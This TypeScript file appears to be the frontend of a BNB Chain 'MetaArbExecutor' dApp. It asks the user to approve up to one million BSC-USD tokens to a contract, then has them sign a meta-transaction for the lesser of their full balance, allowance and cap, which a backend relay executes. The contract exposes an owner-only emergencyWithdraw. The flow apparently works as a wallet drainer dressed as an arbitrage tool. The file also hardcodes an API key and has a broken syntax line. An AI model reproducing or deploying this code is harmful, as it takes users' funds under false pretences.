import { ethers } from 'ethers';

// Get contract address dynamically from localStorage or env
const getContractAddress = () => {
  if (typeof window !== 'undefined') {
    const stored = localStorage.getItem('contract_address');
    if (stored && stored !== 'Not set') {
      return stored;
    }
  }
  return process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0x23F417BBc7d15ed099A0a6B4556e616282F0D19E";
};

export const CONFIG = {
  RPC_URL: process.env.NEXT_PUBLIC_BSC_RPC_URL || "https://bnb-mainnet.g.alchemy.com/v2/SESyM2eIL2MuTgi52m27E", ",
  get CONTRACT_ADDRESS() {
    return getContractAddress();
  },
  TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
  OWNER_CAP: process.env.NEXT_PUBLIC_OWNER_CAP || "1000000"
};

export const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

export const EXECUTOR_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ECDSAInvalidSignature",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "length",
        "type": "uint256"
      }
    ],
    "name": "ECDSAInvalidSignatureLength",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "ECDSAInvalidSignatureS",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "DOMAIN_SEPARATOR",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "META_TX_TYPEHASH",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "Incomingamount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "signature",
        "type": "bytes"
      }
    ],
    "name": "executeMetaTx",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

export async function switchToBSC() {
  if (!window.ethereum) throw new Error('No web3 wallet found');

  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }], // BSC mainnet
    });
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18,
            },
            rpcUrls: ['https://bnb-mainnet.g.alchemy.com/v2/SESyM2eIL2MuTgi52m27E'],
            blockExplorerUrls: ['https://bscscan.com/'],
          }],
        });
      } catch (addError: any) {
        throw new Error('Failed to add BSC to your wallet: ' + addError.message);
      }
    } else {
      throw new Error('Failed to switch network: ' + switchError.message);
    }
  }
}

export async function approveToken(signer: ethers.Signer) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
  const decimals = await token.decimals().catch(() => 18);
  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
  await tx.wait();
  return tx;
}

export async function prepareAndSignTransaction(
  signer: ethers.Signer,
  provider: ethers.BrowserProvider,
  userAddress: string
) {
  console.log('[v0] Step 1: Fetching token info and balances');
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
  const [decimals, allowance, balance] = await Promise.all([
    token.decimals().catch(() => 18),
    token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
    token.balanceOf(userAddress)
  ]);
  console.log('[v0] Decimals:', decimals, 'Allowance:', allowance.toString(), 'Balance:', balance.toString());

  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  let incoming = balance;
  if (allowance < incoming) incoming = allowance;
  if (ownerCapRaw && ownerCapRaw < incoming) incoming = ownerCapRaw;
  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');
  console.log('[v0] Step 2: Calculated incoming amount:', incoming.toString());

  const network = await provider.getNetwork();
  const chainId = network.chainId;
  console.log('[v0] Step 3: Network chainId:', chainId);
  
  const domain = {
    name: 'MetaArbExecutor',
    version: '1',
    chainId: Number(chainId),
    verifyingContract: CONFIG.CONTRACT_ADDRESS
  };
  const types = {
    MetaTransaction: [
      { name: 'user', type: 'address' },
      { name: 'token', type: 'address' },
      { name: 'Incomingamount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]
  };

  const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
  const nonce = await executor.nonces(userAddress);
  const deadline = Math.floor(Date.now() / 1000) + 3600;
  console.log('[v0] Step 4: Nonce:', nonce.toString(), 'Deadline:', deadline);

  const message = {
    user: userAddress,
    token: CONFIG.TOKEN_ADDRESS,
    Incomingamount: incoming.toString(),
    nonce: nonce.toString(),
    deadline: deadline
  };
  
  console.log('[v0] Step 5: Requesting user signature...');
  const rawSig = await signer.signTypedData(domain, types, message);
  console.log('[v0] Step 6: Signature received, length:', rawSig.length);

  // Send to backend for secure relay execution
  console.log('[v0] Step 7: Sending to relay API...');
  const response = await fetch('/api/relay', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      user: message.user,
      token: message.token,
      amount: incoming.toString(),
      deadline: message.deadline,
      signature: rawSig
    })
  });

  if (!response.ok) {
    const error = await response.json();
    console.error('[v0] Relay API error:', error);
    throw new Error(error?.error || 'Transaction relay failed');
  }

  const result = await response.json();
  console.log('[v0] Step 8: Transaction successful! TxHash:', result.txHash);
  return result;
}
